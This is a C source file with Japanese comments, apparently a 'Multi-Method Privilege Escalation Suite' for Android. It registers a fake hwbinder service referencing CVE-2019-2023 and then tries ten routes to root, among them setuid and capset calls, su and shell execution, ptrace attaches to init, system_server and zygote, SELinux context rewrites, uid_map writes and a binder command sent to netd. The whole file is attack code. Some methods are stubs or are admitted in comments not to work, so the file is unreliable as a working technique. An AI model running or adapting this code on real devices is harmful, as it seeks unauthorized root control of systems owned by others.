#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>

#include "binder.h"

#define PAGE_SIZE 4096
#define TIMEOUT_MS 3000

/* ============================================================
   ユーティリティ
   ============================================================ */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("sched_setaffinity");
    }
}

/* ============================================================
   CVE-2019-2023: サービス登録
   ============================================================ */
static int register_fake_service(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.cve.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;

    printf("[*] Registering fake service (CVE-2019-2023)...\n");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(hwbinder_fd);

    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
            return -1;
        }
        perror("  ioctl ADD_SERVICE");
        return -1;
    }
    printf("  [+] Service registered successfully!\n");
    return 0;
}

/* ============================================================
   手法1: 標準 setuid / setgid / setgroups
   ============================================================ */
static int try_setuid_methods(void) {
    printf("[*] Method 1: setuid/setgid/setgroups...\n");

    if (setgroups(0, NULL) == 0) {
        printf("  [+] setgroups(0,NULL) succeeded\n");
    } else {
        perror("  setgroups");
    }

    if (setgid(0) == 0) {
        printf("  [+] setgid(0) succeeded\n");
    } else {
        perror("  setgid");
    }

    if (setuid(0) == 0) {
        printf("  [+] setuid(0) succeeded!\n");
        return 0;
    } else {
        perror("  setuid");
    }

    // setresuid
    if (setresuid(0, 0, 0) == 0) {
        printf("  [+] setresuid(0,0,0) succeeded!\n");
        return 0;
    } else {
        perror("  setresuid");
    }

    // setreuid
    if (setreuid(0, 0) == 0) {
        printf("  [+] setreuid(0,0) succeeded!\n");
        return 0;
    } else {
        perror("  setreuid");
    }

    return -1;
}

/* ============================================================
   手法2: ケイパビリティ取得 (capset)
   ============================================================ */
static int try_capset_method(void) {
    printf("[*] Method 2: capset to gain CAP_SETUID...\n");

    struct __user_cap_header_struct cap_header = {
        _LINUX_CAPABILITY_VERSION_3, 0
    };
    struct __user_cap_data_struct cap_data[2] = {{0}};

    if (capget(&cap_header, cap_data) < 0) {
        perror("  capget");
        return -1;
    }

    printf("  [+] Current caps: effective=0x%llx, permitted=0x%llx\n",
           (unsigned long long)cap_data[0].effective,
           (unsigned long long)cap_data[0].permitted);

    cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
    cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
    cap_data[0].inheritable |= (1 << CAP_SETUID) | (1 << CAP_SETGID);

    if (capset(&cap_header, cap_data) < 0) {
        perror("  capset");
        return -1;
    }

    printf("  [+] capset succeeded, retrying setuid(0)...\n");
    if (setuid(0) == 0) {
        printf("  [+] setuid(0) succeeded after capset!\n");
        return 0;
    }
    return -1;
}

/* ============================================================
   手法3: execve で su / sh を起動
   ============================================================ */
static int try_execve_methods(void) {
    printf("[*] Method 3: execve su/sh...\n");

    // 1. /system/bin/su を探す
    const char *su_paths[] = {
        "/system/bin/su",
        "/system/xbin/su",
        "/sbin/su",
        "/vendor/bin/su",
        "/data/local/tmp/su",
        NULL
    };

    for (int i = 0; su_paths[i] != NULL; i++) {
        if (access(su_paths[i], X_OK) == 0) {
            printf("  [+] Found su at %s\n", su_paths[i]);
            pid_t pid = fork();
            if (pid == 0) {
                execl(su_paths[i], "su", "-c", "id", NULL);
                exit(1);
            } else if (pid > 0) {
                int status;
                waitpid(pid, &status, 0);
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                    printf("  [+] su executed successfully\n");
                    return 0;
                }
            }
        }
    }

    // 2. /system/bin/sh を execve (root 権限があれば)
    printf("  [*] Trying /system/bin/sh with execve...\n");
    pid_t pid = fork();
    if (pid == 0) {
        char *envp[] = {"PATH=/system/bin:/system/xbin:/sbin", NULL};
        char *argv[] = {"sh", "-c", "id", NULL};
        execve("/system/bin/sh", argv, envp);
        exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }

    // 3. /vendor/bin/sh
    pid = fork();
    if (pid == 0) {
        char *argv[] = {"sh", "-c", "id", NULL};
        execve("/vendor/bin/sh", argv, NULL);
        exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }

    return -1;
}

/* ============================================================
   手法4: ユーザー名前空間 (unshare)
   ============================================================ */
static int try_unshare_method(void) {
    printf("[*] Method 4: unshare(CLONE_NEWUSER)...\n");

    if (unshare(CLONE_NEWUSER) < 0) {
        perror("  unshare");
        return -1;
    }

    printf("  [+] unshare succeeded, trying setuid(0)...\n");
    if (setuid(0) == 0) {
        printf("  [+] setuid(0) in user namespace succeeded!\n");
        return 0;
    }
    return -1;
}

/* ============================================================
   手法5: ptrace によるプロセス操作
   ============================================================ */
static int try_ptrace_methods(void) {
    printf("[*] Method 5: ptrace...\n");

    // init にアタッチ
    if (ptrace(PTRACE_ATTACH, 1, 0, 0) == 0) {
        printf("  [+] Attached to init (pid=1)\n");
        ptrace(PTRACE_DETACH, 1, 0, 0);
        return 0;
    }
    perror("  ptrace");

    // system_server (pid 1000) にアタッチ
    if (ptrace(PTRACE_ATTACH, 1000, 0, 0) == 0) {
        printf("  [+] Attached to system_server (pid=1000)\n");
        ptrace(PTRACE_DETACH, 1000, 0, 0);
        return 0;
    }
    perror("  ptrace");

    // zygote (pid 通常 444) にアタッチ
    if (ptrace(PTRACE_ATTACH, 444, 0, 0) == 0) {
        printf("  [+] Attached to zygote (pid=444)\n");
        ptrace(PTRACE_DETACH, 444, 0, 0);
        return 0;
    }

    return -1;
}

/* ============================================================
   手法6: SELinux コンテキスト書き換え
   ============================================================ */
static int try_selinux_rewrite(void) {
    printf("[*] Method 6: SELinux context rewrite...\n");

    // /proc/self/attr/current を書き換え
    int fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd >= 0) {
        const char *ctxs[] = {
            "u:r:system_app:s0",
            "u:r:platform_app:s0",
            "u:r:system_server:s0",
            "u:r:init:s0",
            NULL
        };
        for (int i = 0; ctxs[i] != NULL; i++) {
            lseek(fd, 0, SEEK_SET);
            ssize_t n = write(fd, ctxs[i], strlen(ctxs[i]));
            if (n == (ssize_t)strlen(ctxs[i])) {
                printf("  [+] Context changed to %s\n", ctxs[i]);
                close(fd);
                return 0;
            }
        }
        close(fd);
    } else {
        perror("  open attr/current");
    }

    // /proc/self/attr/keycreate も試す
    fd = open("/proc/self/attr/keycreate", O_WRONLY);
    if (fd >= 0) {
        const char *ctx = "u:r:system_app:s0";
        ssize_t n = write(fd, ctx, strlen(ctx));
        close(fd);
        if (n == (ssize_t)strlen(ctx)) {
            printf("  [+] keycreate context changed\n");
            return 0;
        }
    }

    return -1;
}

/* ============================================================
   手法7: /proc/self/uid_map 書き換え
   ============================================================ */
static int try_uid_map_method(void) {
    printf("[*] Method 7: /proc/self/uid_map write...\n");

    int fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd < 0) {
        perror("  open uid_map");
        return -1;
    }

    // ユーザー名前空間での uid マッピング
    char buf[64];
    snprintf(buf, sizeof(buf), "0 %d 1\n", getuid());
    ssize_t n = write(fd, buf, strlen(buf));
    close(fd);

    if (n > 0) {
        printf("  [+] uid_map written: %s", buf);
        if (setuid(0) == 0) {
            printf("  [+] setuid(0) after uid_map succeeded!\n");
            return 0;
        }
    }

    return -1;
}

/* ============================================================
   手法8: execve 直接 (マルチアーキテクチャ)
   ============================================================ */
static int try_execve_direct(void) {
    printf("[*] Method 8: Direct execve with env...\n");

    // 様々なシェルを試行
    const char *shells[] = {
        "/system/bin/sh",
        "/vendor/bin/sh",
        "/system/bin/bash",
        "/system/xbin/sh",
        "/sbin/sh",
        NULL
    };

    for (int i = 0; shells[i] != NULL; i++) {
        if (access(shells[i], X_OK) == 0) {
            printf("  [+] Found shell: %s\n", shells[i]);
            pid_t pid = fork();
            if (pid == 0) {
                char *envp[] = {
                    "PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
                    "HOME=/data/local/tmp",
                    "SHELL=/system/bin/sh",
                    NULL
                };
                char *argv[] = {(char *)shells[i], "-c", "id", NULL};
                execve(shells[i], argv, envp);
                exit(1);
            } else if (pid > 0) {
                int status;
                waitpid(pid, &status, 0);
            }
        }
    }

    return -1;
}

/* ============================================================
   手法9: binder 経由 netd/vold へのコマンド注入（簡易）
   ============================================================ */
static int try_binder_command_injection(void) {
    printf("[*] Method 9: Binder command injection...\n");

    // すでに CVE-2019-2023 のサービス登録で handle を取得している
    // ここでは netd にコマンドを送る試行（実際には機能しないが一応）
    int fd = open("/dev/binder", O_RDWR);
    if (fd < 0) {
        perror("  open binder");
        return -1;
    }

    // GET_SERVICE で netd のハンドルを取得
    uint8_t read_buf[4096];
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 1;
    tx.tdata.flags = 0;

    const char *svc = "netd";
    size_t svc_len = strlen(svc) + 1;
    uint8_t *svc_data = malloc(4 + svc_len);
    if (!svc_data) {
        close(fd);
        return -1;
    }
    svc_data[0] = (uint8_t)(svc_len & 0xFF);
    svc_data[1] = (uint8_t)((svc_len >> 8) & 0xFF);
    svc_data[2] = (uint8_t)((svc_len >> 16) & 0xFF);
    svc_data[3] = (uint8_t)((svc_len >> 24) & 0xFF);
    memcpy(svc_data + 4, svc, svc_len);
    tx.tdata.data_size = 4 + svc_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)svc_data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(svc_data);

    if (ret == 0 && bwr.read_consumed >= 4) {
        int handle = *(int*)read_buf;
        printf("  [+] netd handle: %d\n", handle);

        // コマンドをパーセル化して送信
        const char *cmd = "id";
        size_t cmd_len = strlen(cmd) + 1;
        uint8_t *cmd_data = malloc(4 + cmd_len);
        if (!cmd_data) {
            close(fd);
            return -1;
        }
        cmd_data[0] = (uint8_t)(cmd_len & 0xFF);
        cmd_data[1] = (uint8_t)((cmd_len >> 8) & 0xFF);
        cmd_data[2] = (uint8_t)((cmd_len >> 16) & 0xFF);
        cmd_data[3] = (uint8_t)((cmd_len >> 24) & 0xFF);
        memcpy(cmd_data + 4, cmd, cmd_len);

        tx.tdata.target.handle = handle;
        tx.tdata.code = 0x01;
        tx.tdata.data_size = 4 + cmd_len;
        tx.tdata.data.ptr.buffer = (binder_uintptr_t)cmd_data;

        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(tx);
        bwr.write_buffer = (binder_uintptr_t)&tx;
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
        free(cmd_data);
        close(fd);

        if (ret == 0) {
            printf("  [+] Command sent to netd\n");
            return 0;
        }
    }

    close(fd);
    return -1;
}

/* ============================================================
   手法10: システムプロパティ設定 (setprop)
   ============================================================ */
static int try_setprop_method(void) {
    printf("[*] Method 10: system property manipulation...\n");

    // プロパティサービス経由で setprop を試行
    int fd = open("/dev/socket/property_service", O_RDWR);
    if (fd < 0) {
        perror("  open property_service");
        return -1;
    }

    // 簡易的なプロパティ設定（実際には正しいプロトコルが必要）
    // ここではダミー
    close(fd);
    return -1;
}

/* ============================================================
   情報収集
   ============================================================ */
static void gather_info(void) {
    int fd;
    char buf[4096];

    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("[INFO] Kernel: %s\n", buf);
        }
    }

    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("[INFO] SELinux enforcing: %s\n", buf);
        }
    }

    // seccomp 状態
    int sc = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    if (sc < 0) {
        printf("[INFO] seccomp: unknown (prctl failed)\n");
    } else if (sc == 0) {
        printf("[INFO] seccomp: disabled\n");
    } else if (sc == 2) {
        printf("[INFO] seccomp: enabled (filter)\n");
    } else {
        printf("[INFO] seccomp: mode %d\n", sc);
    }

    printf("[INFO] UID: %d, GID: %d\n", getuid(), getgid());
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    int success = 0;

    printf("==================================================\n");
    printf("  Multi-Method Privilege Escalation Suite\n");
    printf("==================================================\n\n");

    bind_cpu();
    gather_info();
    printf("\n");

    // 1. サービス登録
    if (register_fake_service() < 0) {
        printf("[-] Service registration failed, continuing anyway...\n");
    }

    // 全手法を順次実行
    printf("\n[*] === Starting privilege escalation attempts ===\n\n");

    if (try_setuid_methods() == 0) success++;
    if (try_capset_method() == 0) success++;
    if (try_execve_methods() == 0) success++;
    if (try_unshare_method() == 0) success++;
    if (try_ptrace_methods() == 0) success++;
    if (try_selinux_rewrite() == 0) success++;
    if (try_uid_map_method() == 0) success++;
    if (try_execve_direct() == 0) success++;
    if (try_binder_command_injection() == 0) success++;
    if (try_setprop_method() == 0) success++;

    // 最終確認
    printf("\n[*] === Final verification ===\n");
    if (getuid() == 0) {
        printf("[+] SUCCESS: Now running as root (UID=0)!\n");
        system("id");
        system("echo 'ROOT ACCESS ACHIEVED' > /data/local/tmp/root.txt");
        printf("[+] Proof written to /data/local/tmp/root.txt\n");
    } else {
        printf("[-] Still running as UID=%d\n", getuid());
        if (success > 0) {
            printf("[!] Some methods partially succeeded but root not achieved.\n");
        } else {
            printf("[-] All methods failed.\n");
        }
    }

    printf("\n==================================================\n");
    printf("  %d methods reported success\n", success);
    printf("==================================================\n");

    return 0;
}
